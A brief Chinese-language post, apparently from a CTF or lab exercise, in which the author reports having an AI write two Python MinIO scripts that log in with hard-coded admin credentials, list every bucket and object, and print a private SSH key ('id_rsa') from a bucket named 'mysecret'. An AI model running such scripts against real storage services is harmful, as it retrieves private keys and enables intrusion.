让ai写了个请求，发现有个私钥的bucket

```bash
python3 -c "
from minio import Minio
client = Minio('127.0.0.1:9000', access_key='dszminioadmin', secret_key='dszminioadmin-01', secure=False)
buckets = client.list_buckets()
for b in buckets:
    print(f'Bucket: {b.name}')
    objects = client.list_objects(b.name, recursive=True)
    for obj in objects:
        print(f' - {obj.object_name}')
"
```

ai写个打印私钥的请求

```bash
python3 -c "
from minio import Minio
client = Minio('127.0.0.1:9000', access_key='dszminioadmin', secret_key='dszminioadmin-01', secure=False)
data = client.get_object('mysecret', 'id_rsa')
print(data.read().decode())
"
```
